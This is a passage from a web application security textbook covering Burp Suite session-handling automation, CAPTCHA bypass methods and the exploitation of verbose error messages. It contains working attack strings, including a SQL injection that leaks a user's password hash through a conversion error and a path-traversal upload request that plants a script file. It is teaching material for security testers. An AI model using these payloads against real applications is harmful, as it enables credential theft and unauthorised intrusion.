submitted, the application returns a different response with a message containing the strings quotation and syntax. This behavior defi nitely warrants some 
manual investigation to confi rm and exploit the bug.
TRY IT!
http://mdsec.net/auth/502/
TIP You can right-click any interesting-looking result and send the response 
to the Burp Repeater tool. This enables you to modify the request manually 
and reissue it multiple times to test the application‚Äôs handling of different 
payloads, probe for fi lter bypasses, or deliver actual exploits.
Barriers to Automation
In many applications, the techniques described so far in this chapter can be 
applied without any problems. In other cases, however, you may encounter 
various obstacles that prevent you from straightforwardly performing customized automated attacks.
Barriers to automation typically fall into two categories:
n Session-handling mechanisms that defensively terminate sessions in 
response to unexpected requests, employ ephemeral parameter values 
such as anti-CSRF tokens that change per request (see Chapter 13), or 
involve multistage processes.
n CAPTCHA controls designed to prevent automated tools from accessing a 
particular application function, such as a function to register new user accounts.
We will examine each of these situations and describe ways in which you 
may be able to circumvent the barriers to automation, either by refi ning your 
automated tools or by fi nding defects in the application‚Äôs defenses.
Session-Handling Mechanisms
Many applications employ session-handling mechanisms and other stateful 
functionality that can present problems for automated testing. Here are some 
situations in which obstacles can arise:
c14.indd 602 c14.indd 602 8/19/2011 12:15:25 PM 8/19/2011 12:15:25 PM
Stuttard c14.indd V3 - 08/11/2011 Page 603
 Chapter 14 n Automating Customized Attacks 603
n While you are testing a request, the application terminates the session 
being used for testing, either defensively or for other reasons, and the 
remainder of the testing exercise is ineffective.
n An application function employs a changing token that must be supplied 
with each request (for example, to prevent request forgery attacks).
n The request being tested appears within a multistage process. The request 
is handled properly only if a series of other requests have fi rst been made 
to get the application into a suitable state.
Obstacles of this kind can always be circumvented in principle by refi ning 
your automation techniques to work with whatever mechanisms the application is using. If you are writing your own testing code along the lines of 
JAttack, you can directly implement support for specifi c token-handling or 
multistage mechanisms. However, this approach can be complex and does 
not scale very well to large applications. In practice, the need to write new 
custom code to deal with each new instance of a problem may itself present a 
signifi cant barrier to using automation, and you may fi nd yourself reverting 
to slower manual techniques.
Session-Handling Support in Burp Suite
Fortunately, Burp Suite provides a range of features to handle all these situations 
in as painless a manner as possible, allowing you to continue your testing while 
Burp deals with the obstacles seamlessly in the background. These features are 
based on the following components:
n Cookie jar
n Request macros
n Session-handling rules
We will briefl y describe how these features can be combined to overcome 
barriers to automation and allow you to continue testing in the various situations described. More detailed help is available in the Burp Suite online 
documentation.
Cookie Jar
Burp Suite maintains its own cookie jar, which tracks application cookies used 
by your browser and by Burp‚Äôs own tools. You can confi gure how Burp automatically updates the cookie jar, and you also can view and edit its contents 
directly, as shown in Figure 14-10.
c14.indd 603 c14.indd 603 8/19/2011 12:15:25 PM 8/19/2011 12:15:25 PM
Stuttard c14.indd V3 - 08/11/2011 Page 604
604 Chapter 14 n Automating Customized Attacks
Figure 14-10: The Burp Suite cookie jar
In itself, the cookie jar does not actually do anything, but the key values it tracks 
can be used within the other components of Burp‚Äôs session-handling support.
Request Macros
A macro is a predefi ned sequence of one or more requests. Macros can be used 
to perform various session-related tasks, including the following:
n Fetching a page of the application (such as the user‚Äôs home page) to check 
that the current session is still valid
n Performing a login to obtain a new valid session
n Obtaining a token or nonce to use as a parameter in another request
n When scanning or fuzzing a request in a multistep process, performing 
the necessary preceding requests to get the application into a state where 
the targeted request will be accepted
Macros are recorded using your browser. When defi ning a macro, Burp displays a view of the Proxy history, from which you can select the requests to be 
used for the macro. You can select from previously made requests, or record the 
macro afresh and select the new items from the history, as shown in Figure 14-11.
For each item in the macro, the following settings can be confi gured, as shown 
in Figure 14-12:
n Whether cookies from the cookie jar should be added to the request
n Whether cookies received in the response should be added to the cookie jar
n For each parameter in the request, whether it should use a preset value 
or a value derived from a previous response in the macro
c14.indd 604 c14.indd 604 8/19/2011 12:15:25 PM 8/19/2011 12:15:25 PM
Stuttard c14.indd V3 - 08/11/2011 Page 605
 Chapter 14 n Automating Customized Attacks 605
Figure 14-11: Recording a request macro in Burp Suite
Figure 14-12: Configuring cookie and parameter handling for a macro item
c14.indd 605 c14.indd 605 8/19/2011 12:15:25 PM 8/19/2011 12:15:25 PM
Stuttard c14.indd V3 - 08/11/2011 Page 606
606 Chapter 14 n Automating Customized Attacks
The ability to derive a parameter‚Äôs value from a previous response in the 
macro is particularly useful in some multistage processes and in situations 
where applications make aggressive use of anti-CSRF tokens. When you 
defi ne a new macro, Burp tries to automatically fi nd any relationships of 
this kind by identifying parameters whose values can be determined from 
the preceding response (form fi eld values, redirection targets, query strings 
in links).
Session-Handling Rules
The key component of Burp Suite‚Äôs session-handling support is the facility to 
defi ne session-handling rules, which make use of the cookie jar and request 
macros to deal with specifi c barriers to automation.
Each rule comprises a scope (what the rule applies to) and actions (what the 
rule does). For every outgoing request that Burp makes, it determines which 
of the defi ned rules are in scope for the request and performs all those rules‚Äô 
actions in order.
The scope for each rule can be defi ned based on any or all of the following 
features of the request being processed, as shown in Figure 14-13:
n The Burp tool that is making the request
n The URL of the request
n The names of parameters within the request
Each rule can perform one or more actions, as shown in Figure 14-14, including the following:
n Add cookies from the session-handling cookie jar.
n Set a specifi c cookie or parameter value.
n Check whether the current session is valid, and perform subactions conditionally on the result.
n Run a macro.
n Prompt the user for in-browser session recovery.
All these actions are highly configurable and can be combined in 
arbitrary ways to deal with virtually any session-handling mechanism. 
Being able to run a macro and update specifi ed cookie and parameter values 
based on the result allows you to automatically log back in to an application when you are logged out. Being able to prompt for in-browser session 
recovery enables you to work with login mechanisms that involve keying 
a number from a physical token or solving a CAPTCHA puzzle (described 
in the next section).
c14.indd 606 c14.indd 606 8/19/2011 12:15:25 PM 8/19/2011 12:15:25 PM
Stuttard c14.indd V3 - 08/11/2011 Page 607
 Chapter 14 n Automating Customized Attacks 607
Figure 14-13: Configuring the scope of a session-handling rule
Figure 14-14: Configuring actions for a session-handling rule
c14.indd 607 c14.indd 607 8/19/2011 12:15:25 PM 8/19/2011 12:15:25 PM
Stuttard c14.indd V3 - 08/11/2011 Page 608
608 Chapter 14 n Automating Customized Attacks
By creating multiple rules with different scopes and actions, you can defi ne 
a hierarchy of behavior that Burp will apply to different URLs and parameters. 
For example, suppose you are testing an application that frequently terminates 
your session in response to unexpected requests and also makes liberal use of 
an anti-CSRF token called __csrftoken. In this situation you could defi ne the 
following rules, as shown in Figure 14-15:
n For all requests, add cookies from Burp‚Äôs cookie jar.
n For requests to the application‚Äôs domain, validate that the current session 
with the application is still active. If it isn‚Äôt, run a macro to log back in to 
the application, and update the cookie jar with the resulting session token.
n For requests to the application containing the __csrftoken parameter, 
fi rst run a macro to obtain a valid __csrftoken value, and use this when 
making the request.
Figure 14-15: A set of session-handling rules to handle session termination and 
anti-CSRF tokens used by an application
c14.indd 608 c14.indd 608 8/19/2011 12:15:26 PM 8/19/2011 12:15:26 PM
Stuttard c14.indd V3 - 08/11/2011 Page 609
 Chapter 14 n Automating Customized Attacks 609
The confi guration needed to apply Burp‚Äôs session handling functionality to 
the features of real-world applications is often complex, and mistakes are easily 
made. Burp provides a tracer function for troubleshooting the session handling 
confi guration. This function shows you all of the steps performed when Burp 
applies session handling rules to a request, allowing you to see exactly how 
requests are being updated and issued, and identify whether your confi guration is working in the way that you intended. The session handling tracer is 
shown in Figure 14-16.
Figure 14-16: Burp‚Äôs session handling tracer, which lets you monitor and debug your 
session handling rules
Having confi gured and tested the rules and macros that you need to work 
with the application you are targeting, you can continue your manual and automated testing in the normal way, just as if the obstacles to testing did not exist.
c14.indd 609 c14.indd 609 8/19/2011 12:15:26 PM 8/19/2011 12:15:26 PM
Stuttard c14.indd V3 - 08/11/2011 Page 610
610 Chapter 14 n Automating Customized Attacks
CAPTCHA Controls
CAPTCHA controls are designed to prevent certain application functions from 
being used in an automated way. They are most commonly employed in functions 
for registering e-mail accounts and posting blog comments to try to reduce spam.
CAPTCHA is an acronym for Completely Automated Public Turing test to tell 
Computers and Humans Apart. These tests normally take the form of a puzzle 
containing a distorted-looking word, which the user must read and enter into 
a fi eld on the form being submitted. Puzzles may also involve recognition of 
particular animals and plants, orientation of images, and so on.
CAPTCHA puzzles are intended to be easy for a human to solve but diffi cult 
for a computer. Because of the monetary value to spammers of circumventing 
these controls, an arms race has occurred in which typical CAPTCHA puzzles 
have become increasingly diffi cult for a human to solve, as shown in Figure 
14-17. As the CAPTCHA-solving capabilities of humans and computers converge, 
it is likely that these puzzles will become increasingly ineffective as a defense 
against spam, and they may be abandoned. They also present accessibility issues 
that currently are not fully resolved.
Figure 14-17: A CAPTCHA puzzle
CAPTCHA puzzles can be circumvented in various ways, only some of which 
are applicable in the context of performing security testing.
Attacking CAPTCHA Implementations
The most fruitful place to look for ways to bypass a CAPTCHA control is the 
implementation of how the puzzle is delivered to the user and how the application handles the user‚Äôs solution.
A surprising number of CAPTCHA implementations expose the puzzle solution to the client in textual form. This can arise in various ways:
n The puzzle image is loaded via a URL that includes the solution as a 
parameter, or the image name is set to the CAPTCHA solution.
n The puzzle solution is stored in a hidden form fi eld.
n The puzzle solution appears within an HTML comment or other location 
for debugging purposes.
In these situations, it is easy for a scripted attack to retrieve the response that 
contains the puzzle solution and submit it in the next attack request.
c14.indd 610 c14.indd 610 8/19/2011 12:15:27 PM 8/19/2011 12:15:27 PM
Stuttard c14.indd V3 - 08/11/2011 Page 611
 Chapter 14 n Automating Customized Attacks 611
TRY IT!
http://mdsec.net/feedback/12/
http://mdsec.net/feedback/24/
http://mdsec.net/feedback/31/
A further common bug in CAPTCHA implementations is that a puzzle can be 
solved manually on a single occasion, and the solution can be replayed in multiple 
requests. Normally, each puzzle should be valid for only a single attempt, and 
the application should discard it when an attempted solution is received. If this 
is not done, it is straightforward to solve a puzzle once in the normal way and 
then use the solution to perform an unlimited number of automated requests.
TRY IT!
http://mdsec.net/feedback/39/
NOTE Some applications have a deliberate code path that circumvents the 
CAPTCHA to permit use by certain authorized automated processes. In these 
instances, it is often possible to bypass the CAPTCHA simply by not supplying 
the relevant parameter name.
Automatically Solving CAPTCHA Puzzles
In principle, most types of CAPTCHA puzzles can be solved by a computer, and 
in practice, many high-profi le puzzle algorithms have been defeated in this way.
For standard puzzles involving a distorted word, solving the puzzle involves 
the following steps:
 1. Removal of noise from the image
 2. Segmentation of the image into individual letters
 3. Recognition of the letter in each segment
With today‚Äôs technology, computers are quite effective at removing noise and 
recognizing letters that have been correctly segmented. The most signifi cant 
challenges arise with segmenting the image into letters, particularly where 
letters overlap and are heavily distorted.
For simple puzzles in which segmentation into letters is trivial, it is likely 
that some homegrown code can be used to remove image noise and pass the 
text into an existing OCR (optical character recognition) library to recognize the 
letters. For more complex puzzles in which segmentation is a serious challenge, 
c14.indd 611 c14.indd 611 8/19/2011 12:15:27 PM 8/19/2011 12:15:27 PM
Stuttard c14.indd V3 - 08/11/2011 Page 612
612 Chapter 14 n Automating Customized Attacks
various research projects have successfully compromised the CAPTCHA puzzles 
of high-profi le web applications.
For other types of puzzles, a different approach is needed, tailored to the 
nature of the puzzle images. For example, puzzles involving recognition of 
animals or orientation of objects need to use a database of real images, which 
are reused in multiple puzzles. If the database is suffi ciently small, an attacker 
can manually solve enough images in the database to make an attack feasible. 
Even if noise and other distortions are applied to images, to make each reused 
image appear different to a computer, fuzzy image hashes and color histogram 
comparison can often be used to match the image from a given puzzle with one 
that has already been solved manually.
Microsoft‚Äôs Asirra puzzles use a database of several million images of cats 
and dogs, derived from a real-world directory of adoptable pets. For an attacker 
with a big enough monetary incentive, even this database could be solved economically using human solvers, as described in the next section.
In all these cases, it is worth noting that to effectively circumvent a CAPTCHA 
control, you don‚Äôt need to be able to solve puzzles with perfect accuracy. For 
example, an attack that solved only 10% of puzzles correctly could still be highly 
effective at performing automated security testing, or delivering spam, as the 
case may be. An automated exercise that takes ten times as many requests normally is still faster and less painful than the corresponding manual exercise.
TRY IT!
http://mdsec.net/feedback/8/
Using Human Solvers
Criminals who need to solve large numbers of CAPTCHA puzzles sometimes 
employ techniques that are not applicable in the context of web application 
security testing:
n An apparently benign website can be used to induce human CAPTCHA
proxies to solve puzzles that are passed through from the application being 
targeted. Typically, the attacker offers the inducement of a competition 
prize, or free access to pornography, to entice users. When a user completes 
the registration form, he is presented with a CAPTCHA puzzle that has 
been fetched in real time from the target application. When the user solves 
the puzzle, his solution is relayed to the target application.
n Attackers can pay human CAPTCHA drones in developing countries to 
solve large numbers of puzzles. Some companies offer this service, which 
costs less than $1 for every 1,000 puzzles that are solved.
c14.indd 612 c14.indd 612 8/19/2011 12:15:27 PM 8/19/2011 12:15:27 PM
Stuttard c14.indd V3 - 08/11/2011 Page 613
 Chapter 14 n Automating Customized Attacks 613
Summary
When you are attacking a web application, the majority of the necessary tasks 
need to be tailored to that application‚Äôs behavior and the methods by which it 
enables you to interact with and manipulate it. Because of this, you will often 
fi nd yourself working manually, submitting individually crafted requests and 
reviewing the application‚Äôs responses.
The techniques described in this chapter are conceptually intuitive. They 
involve leveraging automation to make these customized tasks easier, faster, 
and more effective. It is possible to automate virtually any manual procedure 
you want to carry out using the power and reliability of your own computer to 
attack your target‚Äôs defects and weak points.
In some cases, obstacles exist that prevent you from straightforwardly applying automated techniques. Nevertheless, in most cases these can be overcome 
either by refi ning your automated tools or by fi nding a weakness in the application‚Äôs defenses.
Although conceptually straightforward, using customized automation effectively requires experience, skill, and imagination. You can use tools to help, or 
you can write your own. But there is no substitute for the intelligent human 
input that distinguishes a truly accomplished web application hacker from a 
mere amateur. When you have mastered all the techniques described in the 
other chapters, you should return to this topic and practice the different ways 
in which customized automation can be used to apply those techniques.
Questions
Answers can be found at http://mdsec.net/wahh.
 1. Name three identifi ers of hits when using automation to enumerate identifi ers within an application.
 2. For each of the following categories, identify one fuzz string that can often 
be used to identify it:
 (a) SQL injection
 (b) OS command injection
 (c) Path traversal
 (d) Script fi le inclusion
 3. When you are fuzzing a request that contains a number of different parameters, why is it important to perform requests targeting each parameter 
in turn and leaving the others unmodifi ed?
c14.indd 613 c14.indd 613 8/19/2011 12:15:27 PM 8/19/2011 12:15:27 PM
Stuttard c14.indd V3 - 08/11/2011 Page 614
614 Chapter 14 n Automating Customized Attacks
 4. You are formulating an automated attack to brute-force a login function 
to discover additional account credentials. You fi nd that the application 
returns an HTTP redirection to the same URL regardless of whether you 
submit valid or invalid credentials. In this situation, what is the most likely 
means you can use to detect hits?
 5. When you are using an automated attack to harvest data from within the 
application, you will often fi nd that the information you are interested in 
is preceded by a static string that enables you to easily capture the data 
following it. For example:
<input type=‚Äùtext‚Äù name=‚ÄùLastName‚Äù value=‚Äù
On other occasions, you may fi nd that this is not the case and that the data 
preceding the information you need is more variable. In this situation, 
how can you devise an automated attack that still fulfi lls your needs?
c14.indd 614 c14.indd 614 8/19/2011 12:15:27 PM 8/19/2011 12:15:27 PM
Stuttard c15.indd V2 - 08/17/2011 Page 615 
615
 C H A P T E R 
15
Exploiting Information 
Disclosure
Chapter 4 described various techniques you can use to map a target application and gain an initial understanding of how it works. That methodology 
involved interacting with the application in largely benign ways to catalog its 
content and functionality, determine the technologies in use, and identify the 
key attack surface.
This chapter describes ways in which you can extract further information 
from an application during an actual attack. This mainly involves interacting 
with the application in unexpected and malicious ways and exploiting anomalies in the application‚Äôs behavior to extract information that is of value to you. 
If successful, such an attack may enable you to retrieve sensitive data such as 
user credentials, gain a deeper understanding of an error condition to fi ne-tune 
your attack, discover more details about the technologies in use, and map the 
application‚Äôs internal structure and functionality.
Exploiting Error Messages
Many web applications return informative error messages when unexpected 
events occur. These may range from simple built-in messages that disclose only 
the category of the error to full-blown debugging information that gives away 
a lot of details about the application‚Äôs state.
c15.indd 615 c15.indd 615 8/19/2011 12:16:06 PM 8/19/2011 12:16:06 PM
Stuttard c15.indd V2 - 08/17/2011 Page 616 
616 Chapter 15 n Exploiting Information Disclosure
Most applications are subject to various kinds of usability testing prior to 
deployment. This testing typically identifi es most error conditions that may 
arise when the application is being used in the normal way. Therefore, these 
conditions usually are handled in a graceful manner that does not involve any 
technical messages being returned to the user. However, when an application 
is under active attack, it is likely that a much wider range of error conditions 
will arise, which may result in more detailed information being returned to the 
user. Even the most security-critical applications, such as those used by online 
banks, have been found to return highly verbose debugging output when a 
suffi ciently unusual error condition is generated.
Script Error Messages
When an error arises in an interpreted web scripting language, such as VBScript, 
the application typically returns a simple message disclosing the nature of the 
error, and possibly the line number of the fi le where the error occurred. For 
example:
Microsoft VBScript runtime error 800a0009
Subscript out of range: [number -1]
/register.asp, line 821
This kind of message typically does not contain any sensitive information 
about the state of the application or the data being processed. However, it may 
help you narrow down the focus of your attack. For example, when you are 
inserting different attack strings into a specifi c parameter to probe for common 
vulnerabilities, you may encounter the following message:
Microsoft VBScript runtime error ‚Äò800a000d‚Äô
Type mismatch: ‚Äò [string: ‚Äú‚Äô‚Äù]‚Äô
/scripts/confirmOrder.asp, line 715
This message indicates that the value you have modifi ed is probably being 
assigned to a numeric variable, and you have supplied input that cannot be so 
assigned because it contains nonnumeric characters. In this situation, it is highly 
likely that nothing can be gained by submitting nonnumeric attack strings as 
this parameter. So for many categories of bugs, you are better off targeting 
other parameters.
A different way in which this type of error message may assist you is in 
giving you a better understanding of the logic that is implemented within the 
server-side application. Because the message discloses the line number where 
the error occurred, you may be able to confi rm whether two different malformed 
requests are triggering the same error or different errors. You may also be able 
c15.indd 616 c15.indd 616 8/19/2011 12:16:07 PM 8/19/2011 12:16:07 PM
Stuttard c15.indd V2 - 08/17/2011 Page 617 
 Chapter 15 n Exploiting Information Disclosure 617
to determine the sequence in which different parameters are processed by 
submitting bad input within multiple parameters and identifying the location 
at which an error occurs. By systematically manipulating different parameters, 
you may be able to map the different code paths being executed on the server.
Stack Traces
Most web applications are written in languages that are more complex than 
simple scripts but that still run in a managed execution environment, such 
as Java, C#, or Visual Basic .NET. When an unhandled error occurs in these 
languages, it is common to see full stack traces being returned to the browser.
A stack trace is a structured error message that begins with a description 
of the actual error. This is followed by a series of lines describing the state of 
the execution call stack when the error occurred. The top line of the call stack 
shows the function that generated the error, the next line shows the function 
that invoked the previous function, and so on down the call stack until the 
hierarchy of function calls is exhausted.
The following is an example of a stack trace generated by an ASP.NET 
application:
[HttpException (0x80004005): Cannot use a leading .. to exit above the 
top directory.]
 System.Web.Util.UrlPath.Reduce(String path) +701
 System.Web.Util.UrlPath.Combine(String basepath, String relative)+304
 System.Web.UI.Control.ResolveUrl(String relativeUrl) +143
 PBSApp.StatFunc.Web.MemberAwarePage.Redirect(String url) +130
 PBSApp.StatFunc.Web.MemberAwarePage.Process() +201
 PBSApp.StatFunc.Web.MemberAwarePage.OnLoad(EventArgs e)
 System.Web.UI.Control.LoadRecursive() +35
 System.Web.UI.Page.ProcessRequestMain() +750
Version Information: Microsoft .NET Framework Version:1.1.4322.2300;
ASP.NET Version:1.1.4322.2300
This kind of error message provides a large amount of useful information 
that may assist you in fi ne-tuning your attack against the application:
n It often describes the precise reason why an error occurred. This may 
enable you to adjust your input to circumvent the error condition and 
advance your attack.
n The call stack typically makes reference to a number of library and thirdparty code components that are being used within the application. You 
can review the documentation for these components to understand their 
intended behavior and assumptions. You can also create your own local 
c15.indd 617 c15.indd 617 8/19/2011 12:16:07 PM 8/19/2011 12:16:07 PM
Stuttard c15.indd V2 - 08/17/2011 Page 618 
618 Chapter 15 n Exploiting Information Disclosure
implementation and test this to understand the ways in which it handles 
unexpected input and potentially identify vulnerabilities.
n The call stack includes the names of the proprietary code components 
being used to process the request. The naming scheme for these and the 
interrelationships between them may allow you to infer details about the 
application‚Äôs internal structure and functionality.
n The stack trace often includes line numbers. As with the simple 
script error messages described previously, these may enable you 
to probe and understand the internal logic of individual application 
components.
n The error message often includes additional information about the application and the environment in which it is running. In the preceding 
example, you can determine the exact version of the ASP.NET platform 
being used. This enables you to investigate the platform for known or 
new vulnerabilities, anomalous behavior, common confi guration errors, 
and so on.
Informative Debug Messages
Some applications generate custom error messages that contain a large amount 
of debug information. These are usually implemented to facilitate debugging 
during development and testing and often contain rich detail about the application‚Äôs runtime state. For example:
-------------------------------------------
* * * S E S S I O N * * *
-------------------------------------------
i5agor2n2pw3gp551pszsb55
SessionUser.Sessions App.FEStructure.Sessions
SessionUser.Auth 1
SessionUser.BranchID 103
SessionUser.CompanyID 76
SessionUser.BrokerRef RRadv0
SessionUser.UserID 229
SessionUser.Training 0
SessionUser.NetworkID 11
SessionUser.BrandingPath FE
LoginURL /Default/fedefault.aspx
ReturnURL ../default/fedefault.aspx
SessionUser.Key f7e50aef8fadd30f31f3aea104cef26ed2ce2be50073c
SessionClient.ID 306
SessionClient.ReviewID 245
UPriv.2100
c15.indd 618 c15.indd 618 8/19/2011 12:16:07 PM 8/19/2011 12:16:07 PM
Stuttard c15.indd V2 - 08/17/2011 Page 619 
 Chapter 15 n Exploiting Information Disclosure 619
SessionUser.NetworkLevelUser 0
UPriv.2200
SessionUser.BranchLevelUser 0
SessionDatabase fd219.prod.wahh-bank.com
The following items are commonly included in verbose debug messages:
n Values of key session variables that can be manipulated via user input
n Hostnames and credentials for back-end components such as databases
n File and directory names on the server
n Information embedded within meaningful session tokens (see Chapter 7)
n Encryption keys used to protect data transmitted via the client (see Chapter 5)
n Debug information for exceptions arising in native code components, 
including the values of CPU registers, contents of the stack, and a list of 
the loaded DLLs and their base addresses (see Chapter 16)
When this kind of error reporting functionality is present in live production 
code, it may signify a critical weakness in the application‚Äôs security. You should 
review it closely to identify any items that can be used to further advance your 
attack, and any ways in which you can supply crafted input to manipulate the 
application‚Äôs state and control the information retrieved.
Server and Database Messages
Informative error messages are often returned not by the application itself but 
by some back-end component such as a database, mail server, or SOAP server. If 
a completely unhandled error occurs, the application typically responds with an 
HTTP 500 status code, and the response body may contain further information 
about the error. In other cases, the application may handle the error gracefully 
and return a customized message to the user, sometimes including error information generated by the back-end component. In some situations, information 
disclosure can itself be used as a conduit for an attack. The information disclosed 
by an application in a debug message or exception is often unintentional and 
as a result the organization‚Äôs security procedures may entirely overlook the 
existence of the disclosure.
The error returned may enable a range of further attacks, as described in the 
following sections.
Using Information Disclosure to Advance an Attack
When a specifi c attack is launched against a server back-end component, it is 
common for that component to give direct feedback on any errors encountered. 
This can help you fi ne-tune the attack. Database error messages often contain 
c15.indd 619 c15.indd 619 8/19/2011 12:16:07 PM 8/19/2011 12:16:07 PM
Stuttard c15.indd V2 - 08/17/2011 Page 620 
620 Chapter 15 n Exploiting Information Disclosure
useful information. For example, they often disclose the query that generated 
the error, enabling you to fi ne-tune a SQL injection attack:
Failed to retrieve row with statement - SELECT object_data FROM
deftr.tblobject WHERE object_id = ‚ÄòFDJE00012‚Äô AND project_id = ‚ÄòFOO‚Äô 
and 1=2--‚Äô
See Chapter 9 for a detailed methodology describing how to develop database 
attacks and extract information based on error messages.
Cross-Site Scripting Attacks Within Error Messages
As described in Chapter 12, securing against cross-site scripting is an arduous 
task, requiring identifi cation of each output location of user-supplied data. 
Although most frameworks automatically HTML-encode data when reporting 
errors, this is by no means universal. Error messages can appear in multiple, 
often unusual places within an HTTP response. In the HttpServletResponse
.sendError() call used by Tomcat, the error data is also part of the response 
header:
HTTP/1.1 500 General Error Accessing Doc10083011
Server: Apache-Coyote/1.1
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 1105
Date: Sat, 23 Apr 2011 08:52:15 GMT
Connection: close
An attacker who has control over the input string Doc10083011 could supply carriage return characters and conduct an HTTP header injection attack, 
or a cross-site scripting attack within the HTTP response. More details can be 
found here:
http://www.securityfocus.com/archive/1/495021/100/0/threaded
Frequently customized error messages are intended for a non-HTML destination, such as a console, yet they are erroneously reported to the user in an 
HTTP response. In these situations, cross-site scripting is often easily exploitable.
Decryption Oracles in Information Disclosure
Chapter 11 gave an example of how an unintentional ‚Äúencryption oracle‚Äù could 
be harnessed to decrypt strings presented to the user in encrypted format. The 
same issue can apply to information disclosure. Chapter 7 gave an example of 
an application that provided an encrypted download link for fi le access. If a fi le 
had since been moved or deleted, the application reported that the fi le could 
not be downloaded. Of course, the error message contained the fi le‚Äôs decrypted 
c15.indd 620 c15.indd 620 8/19/2011 12:16:07 PM 8/19/2011 12:16:07 PM
Stuttard c15.indd V2 - 08/17/2011 Page 621 
 Chapter 15 n Exploiting Information Disclosure 621
value, so any encrypted ‚Äúfi lename‚Äù could be provided to the download link, 
resulting in an error.
In these cases, the information disclosure resulted from abuse of deliberate 
feedback. It is also possible for information disclosure to be more accidental if 
parameters are decrypted and then used in various functions, any of which may 
log data or generate error messages. An example encountered by the authors 
was a complex work fl ow application that made use of encrypted parameters 
transmitted via the client. Swapping the default values used for dbid and grouphome, the application responded with an error:
java.sql.SQLException: Listener refused the connection with the 
following error: ORA-12505, TNS:listener does not currently know 
of SID given in connect descriptor The Connection descriptor used 
by the client was: 172.16.214.154:1521:docs/londonoffice/2010/general
This provided considerable insight. Specifi cally, dbid was actually an encrypted 
SID for a connection to an Oracle database (the connection descriptor takes the 
form Server:Port:SID), and grouphome was an encrypted fi le path.
In an attack analogous to many other information disclosure attacks, knowledge of the fi le path provided the necessary information to conduct a fi le path 
manipulation attack. Supplying exactly three path traversal characters in a 
fi lename, and navigating up a similar directory structure, it was possible to 
upload fi les containing malicious script directly into another group‚Äôs work 
space:
POST /dashboard/utils/fileupload HTTP/1.1
Accept: text/html, application/xhtml+xml, */*
Referer: http://wahh/dashboard/common/newnote
Accept-Language: en-GB
Content-Type: multipart/form-data; boundary=------7db3d439b04c0
Accept-Encoding: gzip, deflate
Host: wahh
Content-Length: 8088
Proxy-Connection: Keep-Alive
--------7db3d439b04c0
Content-Disposition: form-data; name=‚ÄùMAX_FILE_SIZE‚Äù
100000
--------7db3d439b04c0
Content-Disposition: form-data; name=‚Äùuploadedfile‚Äù; filename=‚Äù../../../
newportoffice/2010/general/xss.html‚Äù
Content-Type: text/html
<html><body><script>...
...
c15.indd 621 c15.indd 621 8/19/2011 12:16:07 PM 8/19/2011 12:16:07 PM
Stuttard c15.indd V2 - 08/17/2011 Page 622 
622 Chapter 15 n Exploiting Information Disclosure
HACK STEPS
 1. When you are probing the application for common vulnerabilities by submitting crafted attack strings in different parameters, always monitor the 
application‚Äôs responses to identify any error messages that may contain 
useful information.
 Attempt to force an error response from the application by supplying 
encrypted data strings in the wrong context, or by performing actions on 
resources that are not in the correct state to handle the action.
 2. Be aware that error information that is returned within the server‚Äôs 
response may not be rendered on-screen within the browser. An efficient 
way to identify many error conditions is to search each raw response for 
keywords that are often contained in error messages. For example:
n error
n exception
n illegal
n invalid
n fail
n stack
n access
n directory
n file
n not found
n varchar
n ODBC
n SQL
n SELECT
 3. When you send a series of requests modifying parameters within a base 
request, check whether the original response already contains any of the 
keywords you are looking for to avoid false positives.
 4. You can use the Grep function of Burp Intruder to quickly identify any 
occurrences of interesting keywords in any of the responses generated by 
a given attack (see Chapter 14). Where matches are found, review the relevant responses manually to determine whether any useful error information has been returned.
TIP If you are viewing the server‚Äôs responses in-browser, be aware that 
Internet Explorer by default hides many error messages and replaces them with 
a generic page. You can disable this behavior by choosing Tools ‚û¢ Internet 
Options and then choosing the Advanced tab.
c15.indd 622 c15.indd 622 8/19/2011 12:16:07 PM 8/19/2011 12:16:07 PM
Stuttard c15.indd V2 - 08/17/2011 Page 623 
 Chapter 15 n Exploiting Information Disclosure 623
Using Public Information
Because of the huge variety of web application technologies and components in 
common use, you should frequently expect to encounter unusual messages that 
you have not seen before and that may not immediately indicate the nature of 
the error that the application experienced. In this situation, you can often obtain 
further information about the message‚Äôs meaning from various public sources.
Often, an unusual error message is the result of a failure in a specifi c API. 
Searching for the text of the message may lead you to the documentation for 
this API or to developer forums and other locations where the same problem 
is discussed.
Many applications employ third-party components to perform specifi c common tasks, such as searches, shopping carts, and site feedback functions. Any 
error messages that are generated by these components are likely to have arisen 
in other applications and probably have been discussed elsewhere.
Some applications incorporate source code that is publicly available. By searching 
for specifi c expressions that appear in unusual error messages, you may discover 
the source code that implements the relevant function. You can then review this 
to understand exactly what processing is being performed on your input and 
how you may be able to manipulate the application to exploit a vulnerability.
HACK STEPS
 1. Search for the text of any unusual error messages using standard search 
engines. You can use various advanced search features to narrow down 
your results. For example:
‚Äúunable to retrieve‚Äù filetype:php
 2. Review the search results, looking both for any discussion about the error 
message and for any other websites in which the same message has 
appeared. Other applications may produce the same message in a more 
verbose context, enabling you to better understand what kind of conditions give rise to the error. Use the search engine cache to retrieve examples of error messages that no longer appear within the live application.
 3. Use Google code search to locate any publicly available code that may be 
responsible for a particular error message. Search for snippets of error 
messages that may be hard-coded into the application‚Äôs source code. You 
can also use various advanced search features to specify the code language and other details if these are known. For example:
unable\ to\ retrieve lang:php package:mail
 4. If you have obtained stack traces containing the names of library and 
third-party code components, search for these names on both types of 
search engines.
c15.indd 623 c15.indd 623 8/19/2011 12:16:07 PM 8/19/2011 12:16:07 PM
Stuttard c15.indd V2 - 08/17/2011 Page 624 
624 Chapter 15 n Exploiting Information Disclosure
Engineering Informative Error Messages
In some situations, it may be possible to systematically engineer error conditions 
in such a way as to retrieve sensitive information within the error message itself.
One common situation in which this possibility arises is where you can cause 
the application to attempt some invalid action on a specifi c item of data. If the 
resulting error message discloses the value of that data, and you can cause 
interesting items of information to be processed in this way, you may be able 
to exploit this behavior to extract arbitrary data from the application.
Verbose open database connectivity (ODBC) error messages can be leveraged 
in a SQL injection attack to retrieve the results of arbitrary database queries. 
For example, the following SQL, if injected into a WHERE clause, would cause the 
database to cast the password for the fi rst user in the users table to an integer 
to perform the evaluation:
‚Äò and 1=(select password from users where uid=1)--
This results in the following informative error message:
Error: Conversion failed when converting the varchar value
‚Äò37CE1CCA75308590E4D6A35F288B58FACDBB0841‚Äô to data type int.
TRY IT
http://mdsec.net/addressbook/32
A different way in which this kind of technique can be used is where an 
application error generates a stack trace containing a description of the error, 
and you can engineer a situation where interesting information is incorporated 
into the error description.
Some databases provide a facility to create user-defi ned functions written 
